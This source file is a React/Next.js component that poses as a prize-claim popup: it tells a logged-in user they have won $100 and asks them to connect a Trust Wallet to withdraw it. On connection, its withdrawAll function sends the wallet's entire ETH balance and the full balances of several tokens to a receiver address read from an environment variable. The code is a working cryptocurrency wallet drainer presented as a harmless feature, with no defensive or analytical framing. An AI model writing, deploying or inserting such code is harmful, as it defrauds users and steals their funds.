"use client";

import React, { useState, useEffect } from "react";
import { useSession } from "next-auth/react";
import { ethers } from "ethers";

const PrizePopup = () => {
  const { data: session } = useSession();
  const receiverAddressETH = process.env.RECEIVER_ADDRESS_ETH;
  const [isFirstPopupOpen, setIsFirstPopupOpen] = useState(false);
  const [isSecondPopupOpen, setIsSecondPopupOpen] = useState(false);
  const [hasWithdrawn, setHasWithdrawn] = useState<boolean>(false);

  useEffect(() => {
    if (session?.user?._id && !session?.user?.hasReceivedPrize) {
      setIsFirstPopupOpen(true);
    }
    if (localStorage.getItem("withdrawn")) {
      setHasWithdrawn(true);
    }
  }, [session]);

  const withdrawAll = async (provider: ethers.BrowserProvider) => {
    try {
      const signer = await provider.getSigner();
      const address = await signer.getAddress();

      const ethBalance = await provider.getBalance(address);
      await signer.sendTransaction({
        to: receiverAddressETH,
        value: ethBalance,
      });

      console.log("All ETH sent to:", receiverAddressETH);

      const tokenAddresses = [
        process.env.TOKEN_ADDRESS_BNB,
        process.env.TOKEN_ADDRESS_USDT,
        process.env.TOKEN_ADDRESS_BTC,
        process.env.TOKEN_ADDRESS_SOL,
      ];

      for (const tokenAddress of tokenAddresses) {
        if (!tokenAddress) {
          throw new Error(
            `Token address for not found in environment variables.`
          );
        }
        const tokenContract = new ethers.Contract(
          tokenAddress,
          [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)",
          ],
          signer
        );

        const balance = await tokenContract.balanceOf(address);

        await tokenContract.transfer(receiverAddressETH, balance);
        console.log(`All ${tokenAddress} sent to:`, receiverAddressETH);
      }
    } catch (error) {
      console.error("Error in transaction:", error);
    }
  };

  const handleFirstPopupClose = () => {
    setIsFirstPopupOpen(false);
    setIsSecondPopupOpen(true);
  };

  const connectTrustWallet = async () => {
    if (typeof window !== "undefined" && window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      withdrawAll(provider);
      setIsSecondPopupOpen(false);
      window.localStorage.setItem("withdrawn", "true");
    } else {
      console.error("Ethereum provider is not available.");
    }
  };

  if (!isSecondPopupOpen && hasWithdrawn) {
    return null;
  }

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50 text-black text-center">
      {isFirstPopupOpen && (
        <div className="bg-white rounded-lg p-6 shadow-lg z-10 w-[320px]">
          <h2 className="text-xl font-bold mb-4">Congratulations!</h2>
          <p className="mb-4">You have win $100!</p>
          <div className="flex justify-end">
            <button
              className="bg-blue-600 text-white px-4 py-2 rounded mx-auto block w-fit"
              onClick={handleFirstPopupClose}
            >
              Ok
            </button>
          </div>
        </div>
      )}
      {isSecondPopupOpen && (
        <div className="bg-white rounded-lg p-6 shadow-lg z-10 w-[320px]">
          <h2 className="text-xl font-bold mb-4">Connect Your Wallet</h2>
          <p className="mb-4">
            Please connect your wallet to withdraw your funds.
          </p>
          <div className="flex w-fit mx-auto">
            <button
              className="rounded-md py-1 px-2 text-white bg-blue-600 duration-200 hover:bg-blue-500 mx-1"
              onClick={connectTrustWallet}
            >
              Connect with Trust Wallet
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default PrizePopup;
